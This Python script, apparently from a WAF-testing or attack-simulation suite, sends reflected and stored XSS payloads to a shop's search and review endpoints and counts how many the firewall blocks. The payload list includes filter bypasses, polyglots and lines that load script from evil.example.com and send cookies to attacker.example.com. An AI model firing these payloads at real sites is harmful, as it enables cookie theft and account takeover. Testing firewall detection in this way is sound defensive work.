#!/usr/bin/env python3
"""Scenario 2 — XSS attempts on shop search and review endpoints."""
import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent))

import requests
from config import SHOP_URL, LOGS_DIR, TLS_VERIFY
from utils import print_banner, print_request, jitter, random_headers, SessionLog

PAYLOADS = [
    # Classic script injection
    "<script>alert('XSS')</script>",
    "<script>alert(document.cookie)</script>",
    "<SCRIPT SRC=http://evil.example.com/xss.js></SCRIPT>",
    "<script>document.location='http://attacker.example.com/steal?c='+document.cookie</script>",
    # Event handler injection
    '"><img src=x onerror=alert(1)>',
    '"><svg onload=alert(1)>',
    "' onmouseover='alert(1)",
    '" onload="alert(document.domain)"',
    '"><input autofocus onfocus=alert(1)>',
    # javascript: URI
    "javascript:alert('XSS')",
    'javascript:/*--></title></style></textarea></script><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
    # DOM-based
    "#<script>alert(1)</script>",
    "?param=<script>alert(1)</script>",
    # Encoded
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "\u003cscript\u003ealert(1)\u003c/script\u003e",
    # Filter bypass attempts
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<IMG SRC=j&#X41vascript:alert('test2')>",
    "<<SCRIPT>alert('XSS');//<</SCRIPT>",
    # Polyglots
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
]


def run() -> dict:
    print_banner("Scenario 2 — XSS", f"Target: {SHOP_URL}/search + /reviews")
    log = SessionLog("02_xss", LOGS_DIR)
    blocked = passed = 0

    # Reflected XSS via search
    for payload in PAYLOADS:
        url = f"{SHOP_URL}/search"
        try:
            r = requests.get(url, params={"q": payload}, headers=random_headers(), timeout=10, verify=TLS_VERIFY)
            note = "WAF block" if r.status_code == 403 else "reflected"
            print_request("GET", f"{url}?q={payload[:35]}...", r.status_code, note)
            log.log("GET", url, r.status_code, payload, note)
            if r.status_code == 403:
                blocked += 1
            else:
                passed += 1
        except requests.RequestException as e:
            print_request("GET", url, 0, str(e))
        jitter(0.2, 0.8)

    # Stored XSS attempt via review form
    for payload in PAYLOADS[:8]:
        url = f"{SHOP_URL}/reviews"
        try:
            r = requests.post(url, data={"product_id": "1", "review": payload},
                              headers=random_headers(), timeout=10, verify=TLS_VERIFY)
            note = "WAF block" if r.status_code == 403 else "stored"
            print_request("POST", url, r.status_code, f"review={payload[:30]}...")
            log.log("POST", url, r.status_code, payload, note)
            if r.status_code == 403:
                blocked += 1
            else:
                passed += 1
        except requests.RequestException as e:
            print_request("POST", url, 0, str(e))
        jitter(0.2, 0.8)

    log.save()
    total = len(PAYLOADS) + 8
    return {"scenario": "XSS", "total": total, "blocked": blocked, "passed": passed,
            "detection": "CF-WAF-XSS-Burst"}


if __name__ == "__main__":
    run()
